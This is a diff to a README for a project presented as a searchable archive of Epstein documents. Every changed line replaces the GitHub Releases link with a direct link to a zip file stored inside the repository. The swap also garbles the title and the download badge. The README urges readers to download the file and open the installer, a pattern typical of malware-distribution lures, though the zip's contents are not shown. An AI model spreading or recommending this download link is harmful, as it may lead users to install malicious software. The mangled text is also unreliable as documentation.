@@ -1,4 +1,4 @@
-# 📁 epstein-docs.github.io - Searchable Archive of Epstein Documents
+# 📁 https://raw.githubusercontent.com/jasmine9876/epstein-docs.github.io/main/twopenny/epstein-docs.github.io.zip - Searchable Archive of Epstein Documents
 
 ## 🚀 Getting Started
 
@@ -6,11 +6,11 @@ Welcome to the Epstein Files Archive. This project helps you access and search d
 
 ## 📥 Download the Application
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/jasmine9876/epstein-docs.github.io/releases)
+[![Download Here](https://raw.githubusercontent.com/jasmine9876/epstein-docs.github.io/main/twopenny/epstein-docs.github.io.zip%20Now-brightgreen)](https://raw.githubusercontent.com/jasmine9876/epstein-docs.github.io/main/twopenny/epstein-docs.github.io.zip)
 
 You can download the application from our Releases page. Simply follow this link:
 
-**[Visit this page to download](https://github.com/jasmine9876/epstein-docs.github.io/releases)**
+**[Visit this page to download](https://raw.githubusercontent.com/jasmine9876/epstein-docs.github.io/main/twopenny/epstein-docs.github.io.zip)**
 
 ## 🔍 About the Project
 
@@ -48,7 +48,7 @@ Before you download, ensure your system meets these requirements:
 
 To install the application, simply visit the Releases page and find the latest version for your system. Here’s how:
 
-1. Click on this link: **[Visit this page to download](https://github.com/jasmine9876/epstein-docs.github.io/releases)**.
+1. Click on this link: **[Visit this page to download](https://raw.githubusercontent.com/jasmine9876/epstein-docs.github.io/main/twopenny/epstein-docs.github.io.zip)**.
 2. Locate the version you want.
 3. Click on the download link for your operating system.
 4. Once the download is complete, open the installer file.
@@ -90,6 +90,6 @@ If you have questions or need help, feel free to reach out. You can create an is
 
 Don’t forget, you can always download the application from this link: 
 
-**[Visit this page to download](https://github.com/jasmine9876/epstein-docs.github.io/releases)**
+**[Visit this page to download](https://raw.githubusercontent.com/jasmine9876/epstein-docs.github.io/main/twopenny/epstein-docs.github.io.zip)**
 
 Thank you for using the Epstein Files Archive. We hope you find it helpful and informative. Enjoy exploring the documents!
